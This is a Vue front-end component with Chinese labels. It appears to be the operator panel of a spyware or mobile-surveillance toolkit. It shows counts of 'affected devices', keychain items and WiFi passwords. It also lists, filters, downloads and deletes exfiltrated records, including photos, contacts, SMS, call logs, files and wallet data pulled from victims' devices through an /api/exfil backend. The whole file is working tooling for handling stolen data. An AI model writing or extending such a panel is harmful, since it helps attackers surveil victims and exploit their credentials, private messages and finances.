<template>
  <div class="exfil">
    <!-- 统计卡片 -->
    <el-row :gutter="15" class="stats-row">
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #f56c6c;">
              <el-icon size="28"><Download /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.total || 0 }}</div>
              <div class="stat-label">数据总数</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #e6a23c;">
              <el-icon size="28"><Iphone /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.devices || 0 }}</div>
              <div class="stat-label">受影响设备</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #409eff;">
              <el-icon size="28"><Key /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.by_category?.keychain || 0 }}</div>
              <div class="stat-label">Keychain</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #67c23a;">
              <el-icon size="28"><Link /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.by_category?.wifi || 0 }}</div>
              <div class="stat-label">WiFi密码</div>
            </div>
          </div>
        </el-card>
      </el-col>
    </el-row>

    <!-- 操作工具栏 -->
    <el-card>
      <div class="toolbar">
        <div class="search-bar">
          <el-input v-model="filters.device_uuid" placeholder="设备UUID" style="width: 250px;" />
          <el-select v-model="filters.category" placeholder="数据类别">
            <el-option label="全部" value="" />
            <el-option label="Keychain" value="keychain" />
            <el-option label="WiFi" value="wifi" />
            <el-option label="照片" value="photos" />
            <el-option label="通讯录" value="contacts" />
            <el-option label="短信" value="sms" />
            <el-option label="通话" value="calls" />
            <el-option label="文件" value="files" />
            <el-option label="钱包" value="wallet" />
          </el-select>
          <el-button type="primary" @click="loadExfil">查询</el-button>
          <el-button @click="resetFilters">重置</el-button>
        </div>
      </div>
      
      <el-table :data="exfilData" border v-loading="loading">
        <el-table-column prop="id" label="ID" width="80" />
        <el-table-column prop="device_uuid" label="设备UUID" width="250" show-overflow-tooltip />
        <el-table-column prop="category" label="类别" width="120">
          <template #default="scope">
            <el-tag :type="getCategoryType(scope.row.category)">
              {{ getCategoryName(scope.row.category) }}
            </el-tag>
          </template>
        </el-table-column>
        <el-table-column prop="path" label="原始路径" show-overflow-tooltip />
        <el-table-column prop="description" label="描述" show-overflow-tooltip />
        <el-table-column prop="file_size" label="大小" width="100">
          <template #default="scope">
            {{ formatSize(scope.row.file_size) }}
          </template>
        </el-table-column>
        <el-table-column prop="uploaded_at" label="上传时间" width="180" />
        <el-table-column label="操作" width="150">
          <template #default="scope">
            <el-button size="small" @click="downloadExfil(scope.row.id)">下载</el-button>
            <el-button size="small" type="danger" @click="deleteExfil(scope.row.id)">删除</el-button>
          </template>
        </el-table-column>
      </el-table>
      
      <el-pagination
        @size-change="handleSizeChange"
        @current-change="handleCurrentChange"
        :current-page="pagination.page"
        :page-sizes="[10, 20, 50]"
        :page-size="pagination.size"
        :total="pagination.total"
        layout="total, sizes, prev, pager, next, jumper"
      />
    </el-card>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted } from 'vue'
import axios from '../utils/axios'
import { Download, Iphone, Key } from '@element-plus/icons-vue'
import { formatBytes, formatDateTime, getCategoryName, getCategoryType } from '../utils'

const exfilData = ref([])
const loading = ref(false)
const stats = ref({})

const filters = reactive({
  device_uuid: '',
  category: ''
})

const pagination = reactive({
  page: 1,
  size: 20,
  total: 0
})

function formatSize(size) {
  return formatBytes(size)
}

async function loadStats() {
  try {
    const response = await axios.get('/api/exfil/stats')
    stats.value = response.data
  } catch (error) {
    console.error('加载统计失败:', error)
  }
}

async function loadExfil() {
  loading.value = true
  try {
    const params = new URLSearchParams()
    params.append('skip', (pagination.page - 1) * pagination.size)
    params.append('limit', pagination.size)
    if (filters.device_uuid) params.append('device_uuid', filters.device_uuid)
    if (filters.category) params.append('category', filters.category)
    
    const response = await axios.get(`/api/exfil?${params}`)
    exfilData.value = response.data.items
    pagination.total = response.data.total
  } catch (error) {
    console.error('加载数据失败:', error)
  } finally {
    loading.value = false
  }
}

async function downloadExfil(id) {
  try {
    const response = await axios.get(`/api/exfil/${id}/download`, { responseType: 'blob' })
    const url = window.URL.createObjectURL(new Blob([response.data]))
    const link = document.createElement('a')
    link.href = url
    link.setAttribute('download', `exfil_${id}.bin`)
    document.body.appendChild(link)
    link.click()
    link.remove()
  } catch (error) {
    console.error('下载文件失败:', error)
  }
}

async function deleteExfil(id) {
  if (!confirm('确定要删除这条数据吗？')) return
  try {
    await axios.delete(`/api/exfil/${id}`)
    loadExfil()
    loadStats()
  } catch (error) {
    console.error('删除数据失败:', error)
  }
}

function resetFilters() {
  filters.device_uuid = ''
  filters.category = ''
  loadExfil()
}

function handleSizeChange(size) {
  pagination.size = size
  pagination.page = 1
  loadExfil()
}

function handleCurrentChange(page) {
  pagination.page = page
  loadExfil()
}

onMounted(() => {
  loadStats()
  loadExfil()
})
</script>

<style scoped>
.stats-row {
  margin-bottom: 15px;
}

.stat-card {
  display: flex;
  align-items: center;
  gap: 15px;
}

.stat-icon {
  width: 60px;
  height: 60px;
  border-radius: 8px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: white;
}

.stat-info {
  flex: 1;
}

.stat-value {
  font-size: 24px;
  font-weight: bold;
  color: #333;
}

.stat-label {
  font-size: 14px;
  color: #999;
  margin-top: 5px;
}

.toolbar {
  margin-bottom: 15px;
}

.search-bar {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
}
</style>